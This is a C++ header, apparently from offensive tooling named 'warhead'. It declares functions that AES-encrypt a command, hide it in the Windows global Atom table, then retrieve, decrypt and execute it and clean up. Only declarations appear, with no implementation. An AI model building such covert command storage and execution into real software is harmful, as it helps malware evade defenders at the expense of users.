#pragma once
#include <string>
#include <vector>
#include <windows.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

namespace warhead {
    /**
     * @brief Stores an encrypted command string in the Windows global Atom table.
     * * This function generates a random AES key and IV, encrypts the command string,
     * and stores the IV followed by the encrypted command in the global atom table.
     * @param command The wide string command to store.
     * @return A vector of ATOM handles corresponding to the stored atoms.
     * @throws std::runtime_error on any failure during encryption or atom creation.
     */
    std::vector<ATOM> storeEncryptedCommandInAtoms(const std::wstring& command);

    /**
     * @brief Retrieves and decrypts a command string from the global Atom table.
     * * This function reads the IV and encrypted data from the atoms and decrypts it
     * using the AES key.
     * @param atoms The vector of ATOM handles.
     * @return The reconstructed and decrypted wide string command.
     * @throws std::runtime_error on any failure during retrieval or decryption.
     */
    std::wstring retrieveAndDecryptCommandFromAtoms(const std::vector<ATOM>& atoms);
    
    /**
     * @brief Retrieves, decrypts, and executes a command stored in the Atom table.
     *
     * @param atoms The vector of ATOM handles containing the command.
     * @throws std::runtime_error if the command cannot be retrieved, decrypted, or executed.
     */
    void executeEncryptedCommandFromAtoms(const std::vector<ATOM>& atoms);
    
    /**
     * @brief Deletes a list of atoms from the Windows global Atom table.
     * * @param atoms The vector of ATOM handles to delete.
     */
    void deleteAtoms(const std::vector<ATOM>& atoms);
}